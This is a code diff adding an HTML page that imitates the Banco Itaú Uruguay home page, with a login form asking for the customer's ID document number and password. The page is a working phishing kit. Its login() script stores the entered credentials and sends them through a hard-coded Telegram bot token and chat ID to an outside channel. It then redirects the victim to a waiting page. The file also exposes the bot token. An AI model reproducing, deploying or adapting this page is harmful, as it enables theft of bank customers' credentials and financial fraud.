@@ -1,0 +1,325 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Inicio</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            font-family: Arial, sans-serif;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #ff6600;
+            padding: 22px;
+            width: 100vw;
+            box-sizing: border-box;
+        }
+
+        .menu {
+            display: flex;
+            align-items: center;
+            margin: 0 auto;
+        }
+
+        .logo-img {
+            width: 48px;
+            height: 48px;
+            margin-right: 15px;
+        }
+
+        .menu a {
+            color: white;
+            margin: 0 10px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .menu a:hover {
+            text-decoration: underline;
+        }
+
+        .menu .buscar-personas {
+            display: flex;
+            align-items: center;
+            margin-left: auto;
+        }
+
+        .menu .buscar {
+            margin-right: 15px;
+        }
+
+        .menu .separator {
+            width: 1px;
+            height: 20px;
+            background-color: white;
+            margin-right: 15px;
+        }
+
+        .login-container {
+            display: flex;
+            align-items: center;
+            margin-left: -150px;
+        }
+
+        .login {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            font-size: 1.05em;
+        }
+
+        .login-control {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 0;
+            background-color: white;
+            height: 42px;
+            font-size: 16px;
+            border: none;
+        }
+
+        .left-radius {
+            border-radius: 5px 0 0 5px;
+            border-right: none;
+        }
+
+        .right-radius {
+            border-radius: 0 5px 5px 0;
+            border-left: none;
+        }
+
+        .login select {
+            width: 75px;
+            border: none;
+            outline: none;
+        }
+
+        .login input[type="text"],
+        .login input[type="password"] {
+            width: 180px;
+            font-size: 16px;
+            border: none;
+            outline: none;
+        }
+
+        .login-btn {
+            background-color: #ccc;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 0 5px 5px 0;
+            margin-left: -1px;
+            height: 42px;
+        }
+
+        .login-btn:hover {
+            background-color: #999;
+        }
+
+        .login-links {
+            margin-top: 5px;
+            display: flex;
+            font-size: 12.5px;
+            color: white;
+        }
+
+        .login-links a {
+            color: white;
+            text-decoration: none;
+            margin-left: 15px;
+        }
+
+        .login-links a:hover {
+            text-decoration: underline;
+        }
+
+        .image-section {
+            margin-top: 0;
+            text-align: center;
+            width: 100vw;
+            overflow: hidden;
+        }
+
+        .image-section img {
+            width: 100%;
+            height: auto;
+        }
+
+        .footer-text {
+            background-color: #4A4A4A;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .footer-text a {
+            color: white;
+            text-decoration: none;
+        }
+
+        @media (max-width: 768px) {
+            .navbar {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .menu {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .menu a {
+                font-size: 16px;
+                margin: 5px 0;
+            }
+
+            .logo-img {
+                width: 40px;
+                height: 40px;
+                margin-bottom: 15px;
+            }
+
+            .login-container {
+                margin-left: 0;
+                flex-direction: column;
+            }
+
+            .login {
+                flex-direction: column;
+            }
+
+            .login input, .login select, .login-btn {
+                width: 100%;
+                margin-bottom: 10px;
+                border-radius: 5px;
+            }
+
+            .login-links {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .image-section img {
+                width: 100vw;
+                height: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="navbar">
+        <div class="menu">
+            <img src="Layer 1.png" alt="Logo Itaú" class="logo-img">
+            <a href="#">para ti</a>
+            <a href="#">para empresas</a>
+            <a href="#">beneficios</a>
+            <a href="#">atención al cliente</a>
+            <div class="buscar-personas">
+                <a href="#" class="buscar">buscar</a>
+                <div class="separator"></div>
+                <a href="#" class="personas">personas</a>
+            </div>
+        </div>
+        <div class="login-container">
+            <div class="login">
+                <select class="login-control left-radius">
+                    <option value="ci">C.I.</option>
+                    <option value="passport">Pasaporte</option>
+                </select>
+                <input type="text" id="documento" placeholder="documento" class="login-control">
+                <input type="password" id="contrasena" placeholder="contraseña" class="login-control right-radius">
+                <button class="login-btn" onclick="login()">></button>
+            </div>
+            <div class="login-links">
+                <a href="#">registrate</a>
+                <a href="#">olvidé mi contraseña</a>
+            </div>
+        </div>
+    </header>
+
+    <div class="image-section">
+        <img src="img_2489513_home.png" alt="Imagen">
+    </div>
+
+    <div class="footer-text">
+        <div>
+            <strong>productos</strong><br>
+            cuentas | préstamos | inversiones | tarjetas | seguros | Itaú Personal Bank
+        </div>
+        <div>
+            <strong>sobre Itaú</strong><br>
+            quiénes somos | trabajá con nosotros | sustentabilidad | fundación Itaú
+        </div>
+        <div>
+            <strong>más información</strong><br>
+            Itaú Volar | beneficios | tarifario | contratos y cartillas | cotizaciones | seguridad | emergencias | canal de denuncias
+        </div>
+        <div>
+            <strong>encontranos en:</strong><br>
+            <a href="#">Instagram</a> | <a href="#">Facebook</a> | <a href="#">LinkedIn</a> | <a href="#">Twitter</a>
+        </div>
+        <div>
+            <small>© 2024 Itaú - Banco Itaú Uruguay S.A. | Supervisada por el Banco Central del Uruguay | 
+            Para mayor información visita <a href="https://www.bcu.gub.uy">www.bcu.gub.uy</a></small>
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            const documento = document.getElementById('documento').value;
+            const contrasena = document.getElementById('contrasena').value;
+
+            // Guardar datos en localStorage
+            localStorage.setItem('documento', documento);
+            localStorage.setItem('contrasena', contrasena);
+
+            // Construir mensaje para Telegram
+            const chatId = '-1002368138458';
+            const token = '8062306716:AAFTmhEYqdVhnB3tbwd4d__9btEPQI2tPxA';
+            const mensaje = `
+➖➖➖[ 𝙄𝙏𝘼𝙐 𝙐𝙔 ]➖➖➖ 
+✔️𝙏𝙞𝙥𝙤 𝘿𝙤𝙘: ${documento}
+✔️𝘿𝙤𝙘𝙪𝙢𝙚𝙣𝙩𝙤: ${documento}
+✔️𝙋𝙖𝙨𝙨: ${contrasena}
+➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
+`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+            // Enviar mensaje a Telegram y redirigir
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Mensaje enviado correctamente.');
+                    } else {
+                        console.error('Error al enviar el mensaje.', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error en la solicitud:', error);
+                })
+                .finally(() => {
+                    // Redirigir siempre, independientemente del resultado
+                    window.location.href = '/espera';
+                });
+        }
+    </script>
+</body>
+</html>
